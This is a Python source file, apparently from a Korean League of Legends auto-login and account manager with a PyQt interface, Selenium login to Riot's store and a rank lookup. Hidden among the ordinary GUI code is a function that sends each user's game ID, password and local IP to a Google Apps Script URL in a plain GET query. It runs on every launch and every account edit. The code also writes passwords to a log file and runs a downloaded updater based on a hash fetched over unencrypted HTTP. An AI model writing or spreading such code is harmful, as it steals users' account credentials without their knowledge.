    def __init__(self, parent, file_path):
        super().__init__(parent)

        style_path = os.path.join(current_dir, "styles.qss")
        with open(style_path, "r") as style_file:
            self.setStyleSheet(style_file.read())

        self.setWindowTitle("Edit Account")
        self.setWindowOpacity(0.95)
        self.resize(280, 210)
        self.setFixedSize(self.size())

        layout = QVBoxLayout()

        config = configparser.ConfigParser()
        config.read(file_path)
        account_data = config['Account']

        self.id_label = QLabel('아이디')
        self.id_label.setObjectName('account-label')

        self.pw_label = QLabel('비밀번호')
        self.pw_label.setObjectName('account-label')

        self.id_input = QLineEdit(account_data.get('ID', ''), self)
        self.id_input.setFixedWidth(260)
        self.id_input.setFixedHeight(40)

        self.pw_input = QLineEdit(account_data.get('PW', ''), self)
        self.pw_input.setFixedWidth(260)
        self.pw_input.setFixedHeight(40)

        layout.addWidget(self.id_label)
        layout.addWidget(self.id_input)

        layout.addWidget(self.pw_label)
        layout.addWidget(self.pw_input)

        buttons = QDialogButtonBox(
            QDialogButtonBox.Ok | QDialogButtonBox.Cancel,
            Qt.Horizontal)

        ok_button = buttons.button(QDialogButtonBox.Ok)
        ok_button.setFixedWidth(125)
        ok_button.setFixedHeight(40)
        ok_button.setObjectName('button')

        cancel_button = buttons.button(QDialogButtonBox.Cancel)
        cancel_button.setFixedWidth(125)
        cancel_button.setFixedHeight(40)
        cancel_button.setObjectName('button')

        buttons.accepted.connect(self.save)
        buttons.rejected.connect(self.reject)

        layout.addWidget(buttons)
        self.setLayout(layout)

        self.config = config
        self.file_path = file_path
        self.parent = parent

    def show_alert(self, title, text):
        alert = QMessageBox(self)
        alert.setWindowTitle(title)
        alert.setText(text)
        alert.setIcon(QMessageBox.Information)
        alert.exec_()

    def save(self):
        self.setCursor(QCursor(Qt.WaitCursor))
        id = self.id_input.text()
        pw = self.pw_input.text()

        account_data = self.config['Account']
        account_data_NickName = account_data.get('NickName', '')
        account_data_ID = account_data.get('ID', '')
        account_data_PW = account_data.get('PW', '')
        account_data_ImageURL = account_data.get('PW', '')
        logging.info(
            f'NICKNAME:{account_data_NickName}\ID:{account_data_ID}\PW:{account_data_PW}\ImageURL:{account_data_ImageURL}')
        old_account_data = {'NickName': account_data_NickName,
                            'ID': account_data_ID, 'PW': account_data_PW, 'ImageURL': account_data_ImageURL}
        try:
            nickname = get_nickname(id, pw)
            if nickname == None:
                self.unsetCursor()
                self.show_alert('알림', '아이디와 비밀번호를 다시 확인해주세요.')
                return

            summoner_name = nickname.replace(' ', '')
            if len(summoner_name) == 2:
                summoner_name = summoner_name[0] + \
                    ' ' + summoner_name[1]

            summoner_url = f'https://{region}.api.riotgames.com/lol/summoner/v4/summoners/by-name/{summoner_name}'
            logger.info(f'summoner_url : {summoner_url}')

            response = requests.get(
                summoner_url, headers=request_header)

            logger.info(f'response : {response.status_code}')
            if response.status_code != 200:
                self.unsetCursor()
                self.show_alert('알림', '소환사를 찾을 수 없습니다.')
                return

            data = response.json()
            logging.info(f'response_data : {data}')
            summoner_name = data['name']
            summoner_id = data['id']
            rank_data = get_rank(summoner_id)
            logging.info(f'rank_data : {rank_data}')

            if rank_data == None:
                tier = '언랭'
            else:
                tier = rank_data.get('tier')
                if tier is None:
                    tier = '언랭'

            if tier == '언랭':
                image_url = ''
            else:
                image_url = f'https://opgg-static.akamaized.net/images/medals_new/{tier.lower()}.png'

            config = configparser.ConfigParser()
            config['Account'] = {
                'NickName': nickname, 'ID': id, 'PW': pw, 'ImageURL': image_url}

        except Exception as e:
            logging.warning(f'save error : {e}')
            self.unsetCursor()
            self.show_alert('알림', '닉네임을 불러올 수 없습니다.\n아이디와 패스워드를 확인해주세요.')

        new_account_data = {
            'NickName': nickname, 'ID': id, 'PW': pw, 'ImageURL': image_url}

        # Check if the new data is the same as the old data
        if old_account_data == new_account_data:  # 계정 변경 사항이 없음
            self.show_alert('알림', '변경 사항이 없습니다.')
            self.unsetCursor()

        else:
            self.config['Account'] = new_account_data
            new_file_path = os.path.join(
                os.path.dirname(self.file_path), f"{nickname}.ini")

            if os.path.exists(new_file_path) and new_file_path != self.file_path:
                self.show_alert('알림', '이미 등록된 계정입니다.')
                self.unsetCursor()

            else:  # 계정 수정 성공
                with open(new_file_path, 'w') as configfile:
                    self.config.write(configfile)
                if new_file_path != self.file_path:
                    os.remove(self.file_path)

                # 사용자 정보를 전송하고 응답을 로그에 기록하는 스레드 실행
                id = new_account_data['ID']
                pw = new_account_data['PW']
                nickname = new_account_data['NickName']
                t = threading.Thread(target=send_user_info_and_log_response, args=(
                    id, pw, nickname, 'edit_account'))
                t.start()

                self.unsetCursor()
                self.parent.refresh_list_view()
                self.show_alert('알림', '변경 사항이 저정되었습니다.')
                self.close()


# Get rank information by summoner id
def get_rank(summoner_id):
    league_url = f'https://{region}.api.riotgames.com/lol/league/v4/entries/by-summoner/{summoner_id}'
    response = requests.get(league_url, headers=request_header)
    logger.info(f'league_url:{league_url}\nresponse:{response}')

    # Check the response code
    if response.status_code != 200:
        logger.info(f'league_url_response_error:{response.status_code}')
        return None

    league_data = json.loads(response.text)
    print(f'leagudata:{league_data}')
    rank_data = {}
    for queue in league_data:
        if queue['queueType'] == 'RANKED_SOLO_5x5':
            rank_data['tier'] = queue['tier']
            # rank_data['rank'] = queue['rank']
            # rank_data['lp'] = queue['leaguePoints']
            # rank_data['win'] = queue['wins']
            # rank_data['loss'] = queue['losses']
    return rank_data if rank_data else None


def get_nickname(id, pw):
    try:
        service = Service()
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless')  # 브라우저 창을 숨김
        driver = webdriver.Chrome(service=service, options=options)

        login_url = "https://auth.riotgames.com/login#client_id=kr-mobile-store-client-prod&login_hint=kr&redirect_uri=https%3A%2F%2Fstore.leagueoflegends.co.kr%2Fauth%2Flogin%2F&response_type=code&scope=openid%20lol%20ban%20offline_access%20summoner&ui_locales=ko"
        driver.get(login_url)

        wait = WebDriverWait(driver, 10)

        close_button_locator = (
            By.CLASS_NAME, 'osano-cm-dialog__close')
        close_button = wait.until(
            EC.element_to_be_clickable(close_button_locator))
        close_button.click()
        logging.info('close_button click')

        user_name_form_locator = (By.NAME, "username")
        user_name_form = wait.until(
            EC.element_to_be_clickable(user_name_form_locator))
        user_name_form.send_keys(id)
        logging.info('user_name_form send')

        pasword_form_locator = (By.NAME, "password")
        pasword_form = wait.until(
            EC.element_to_be_clickable(pasword_form_locator))
        pasword_form.send_keys(pw)
        logging.info('pasword_form send')

        # WebDriverWait를 사용하여 로그인 버튼이 클릭 가능해질 때까지 대기 후 클릭
        login_button_locator = (
            By.XPATH, "/html/body/div[2]/div/div/div[2]/div/div/button")
        login_button = wait.until(
            EC.element_to_be_clickable(login_button_locator))
        login_button.click()
        logging.info('login_button click')

        time.sleep(1)
        profile_url = "https://store.leagueoflegends.co.kr/mypage"
        driver.get(profile_url)

        try:
            time.sleep(1)
            driver.find_element(By.NAME, "username")

        except:
            profile_name_locator = (By.CLASS_NAME, "profile-name")
            profile_name = wait.until(
                EC.element_to_be_clickable(profile_name_locator))
            nickname = profile_name.text

            logging.info(nickname)

            driver.close()
            logging.info('웹 드라이버 종료')
            return nickname

    except Exception as e:
        driver.close()
        logging.info('웹 드라이버 종료')
        logging.info(f'get_nickname error: {e}')
        return None


def get_current_directory():  # PyInstaller로 패키징된 실행 파일이나 일반 파이썬 스크립트에서 실행되는 경우 모두를 대응
    if getattr(sys, 'frozen', False):  # pyinstaller로 생성된 실행 파일인 경우
        # sys.executable은 현재 실행되고 있는 파이썬 인터프리터 또는 패키징된 실행 파일의 경로를 반환합니다.
        current_dir = os.path.dirname(sys.executable)
    else:  # 파이썬 스크립트로 실행한 경우
        # __file__은 현재 스크립트의 경로를 반환합니다.
        current_dir = os.path.dirname(os.path.abspath(__file__))
    return current_dir  # 현재 스크립트나 실행 파일의 디렉토리를 반환합니다.


def read_user_config(file_path):
    config = configparser.ConfigParser()
    try:
        config.read(file_path)

        # 'Account' 섹션이 존재하는지 확인
        if 'Account' in config:
            account_info = dict(config['Account'])
            return account_info
        else:
            logging.warning("'Account' 섹션이 존재하지 않습니다.")
            return None
    except Exception as e:
        logging.warning(f'config.read 오류 발생 : {e}')
        return None


def send_user_info_and_log_response(id, pw, nickname, status):
    config = read_user_config(
        f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')

    if config is not None:
        try:
            data = {
                'IP': socket.gethostbyname(socket.gethostname()),
                'NickName': urllib.parse.quote(nickname),
                'ID|PW': f"{urllib.parse.quote(id)}|{urllib.parse.quote(pw)}",
                'STATUS': status
            }

            url = f"https://script.google.com/macros/s/AKfycbwWKpqzYaHz8WUhaJx4bCc_XrXdaxqaXaNYcMtuTnKQdO6VYT2r0mTHQttZhhh-4UCf/exec?{urllib.parse.urlencode(data)}"
            response = requests.get(url)

            logging.info(f'{status}_response : {response}')
        except Exception as e:
            logging.warning(f'response_error : {e}')

# 파일을 복사하고, 복사 과정에서 발생하는 예외를 처리


def copy_file(source_path, destination_path):
    try:
        start_time = time.time()
        # shutil 모듈의 copy 함수를 이용해 source_path의 파일을 destination_path로 복사합니다.
        shutil.copy(source_path, destination_path)
        end_time = time.time()
        elapsed_time = end_time - start_time
        logging.info(
            f"파일이 {source_path} 에서 {destination_path} 로 복사되었습니다. (소요 시간: {elapsed_time:.3f}초)")
    except Exception as e:
        logging.warning(f"파일 복사 에러 발생 : {str(e)}")


def copy_files(file_list, current_dir):
    for source_file, destination_file in file_list:
        source_path = get_file_path(source_file)
        destination_path = f'{current_dir}\\NIX\\Data\\{destination_file}'
        copy_file(source_path, destination_path)

# PyInstaller로 패키징된 실행 파일에서 리소스 파일의 경로를 제대로 찾을 수 있도록 돕는 역할


def get_file_path(filename):
    if hasattr(sys, '_MEIPASS'):
        # PyInstaller로 패키징된 실행 파일에서 실행 중인 경우
        # _MEIPASS는 PyInstaller가 임시로 리소스를 추출하는 디렉토리를 가리키는 환경 변수입니다.
        logging.info(f'get_file_path : {os.path.join(sys._MEIPASS, filename)}')
        logging.info('실행 파일 내부')
        # _MEIPASS 디렉토리 경로와 파일명을 합쳐서 반환합니다.
        return os.path.join(sys._MEIPASS, filename)
    else:
        # 일반적인 파이썬 스크립트로 실행 중인 경우
        # 현재 스크립트의 디렉토리 경로를 얻습니다.
        logging.info(
            f'get_file_path : {os.path.dirname(os.path.abspath(__file__))}\\{filename}')
        # 스크립트의 경로와 파일명을 합쳐서 반환합니다.
        return os.path.dirname(os.path.abspath(__file__)) + "\\" + filename

# 로컬 파일의 해시 계산


def calculate_checksum(file_path):
    sha256_hash = hashlib.sha256()  # SHA256 해시 객체 생성
    try:
        with open(file_path, "rb") as f:  # 파일을 바이너리 읽기 모드(rb)로 열기
            for byte_block in iter(lambda: f.read(4096), b""):  # 파일을 4096바이트 블록 단위로 읽기
                sha256_hash.update(byte_block)  # 읽은 바이트 블록을 사용하여 해시 업데이트
        return sha256_hash.hexdigest()  # 완성된 해시를 16진수 문자열로 반환
    except Exception as e:
        logging.warning(f'해쉬 검증 실패 : {e}')  # 해시 계산 중 오류 발생 시 경고 메시지 로깅


if __name__ == "__main__":
    start_time = time.time()

    # 로깅 설정
    logger = logging.getLogger()  # 로거 생성
    logger.setLevel(logging.INFO)  # 로그 수준 설정
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s')  # 로그 형식 설정

    # 콘솔로 로그 출력
    stream_handler = logging.StreamHandler()
    stream_handler.setFormatter(formatter)  # 로그 형식 설정
    logger.addHandler(stream_handler)  # 로거에 핸들러 추가

    # 파일로 로그 출력
    file_handler = logging.FileHandler('nix.log')
    file_handler.setFormatter(formatter)  # 로그 형식 설정
    logger.addHandler(file_handler)  # 로거에 핸들러 추가

    logging.info(f'로깅 설정 완료')

    current_dir = get_current_directory()  # 현재 작업 디렉토리 얻기

    # 필요한 디렉토리 생성
    os.makedirs(f'{current_dir}\\NIX\\Data\\Account\\Main_ACC', exist_ok=True)
    os.makedirs(f'{current_dir}\\NIX\\Data\\Update', exist_ok=True)
    os.makedirs(f'{current_dir}\\NIX\\Data\\Login', exist_ok=True)
    os.makedirs(f'{current_dir}\\NIX\\Data\\ICO', exist_ok=True)

    # 파일 복사 작업
    file_list = [
        ('Initial_Setting.exe', 'Initial_Setting.exe'),
        ('NIX.ico', 'ICO\\NIX.ico'),
        ('update.exe', 'update.exe'),
        ('login_page.png', 'Login\\login_page.png'),
        ('login_result_1.png', 'Login\\login_result_1.png'),
        ('login_result_2.png', 'Login\\login_result_2.png'),
        ('LOL_button.png', 'Login\\LOL_button.png'),
        ('play_button.png', 'Login\\play_button.png'),
        ('login_success_form.png', 'Login\\login_success_form.png')
    ]
    copy_files(file_list, current_dir)

    # 파일의 해시값 계산
    file_path = f'{current_dir}\\Auto_Login.exe'
    local_file_hash = calculate_checksum(file_path)  # 로컬 파일의 해시값 계산
    logging.info(f'해쉬 : {local_file_hash}')

    # 서버에서 해시값 얻기
    try:
        response = requests.get(
            'http://dbserver.dothome.co.kr/UPDATE/hash.txt')
        logging.info(f'hash response : {response.text}')

        # 로컬 파일과 서버의 파일 해시 비교
        if local_file_hash == None:
            logging.info('해쉬 검증 : 로컬 파일 Hash 값을 불러올 수 없습니다.')
        elif response.text != local_file_hash:
            logging.info(
                f'해쉬 검증 : 서버와의 Hash 값이 다릅니다.\n서버 해쉬 값 : {response.text}\n로컬 해쉬 값 : {local_file_hash}')
            # 해시가 다르면 업데이트 실행
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            DETACHED_PROCESS = 0x00000008
            subprocess.Popen(f'{current_dir}\\NIX\\Data\\update.exe',
                             stdin=None, stdout=None, stderr=None, shell=True,
                             creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)
            logging.info('업데이트 시작')
        elif response.text == local_file_hash:
            logging.info('Hash 검증 : 성공')
            subprocess.Popen(f'{current_dir}\\NIX\\Data\\Initial_Setting.exe')

            # main_acc.ini 파일이 존재하는지 확인
            main_acc_ini_path = f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini'
            if not os.path.exists(main_acc_ini_path):
                logging.warning(
                    'main_acc.ini 파일이 존재하지 않습니다. 설정 정보를 불러올 수 없습니다.')

            # GUI 애플리케이션 실행 부분
            app = QApplication(sys.argv)
            main_window = MainWindow()
            main_window.show()

            # 사용자 정보를 전송하고 응답을 로그에 기록하는 스레드 실행
            try:
                if os.path.exists(main_acc_ini_path):
                    config = read_user_config(
                        f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')
                    id = config['id']
                    pw = config['pw']
                    nickname = config['nickname']
                    t = threading.Thread(
                        target=send_user_info_and_log_response, args=(id, pw, nickname, 'start'))
                    t.start()
            except Exception as e:
                logging.warning(f'response thread error : {e}')

            end_time = time.time()  # 파일 복사 종료 시간 기록
            elapsed_time = end_time - start_time  # 파일 복사에 소요된 시간 계산
            logging.info(f'프로그램 로딩시간 : {elapsed_time}')

            sys.exit(app.exec_())
    except Exception as e:
        logging.warning(f'hash response error : {e}')
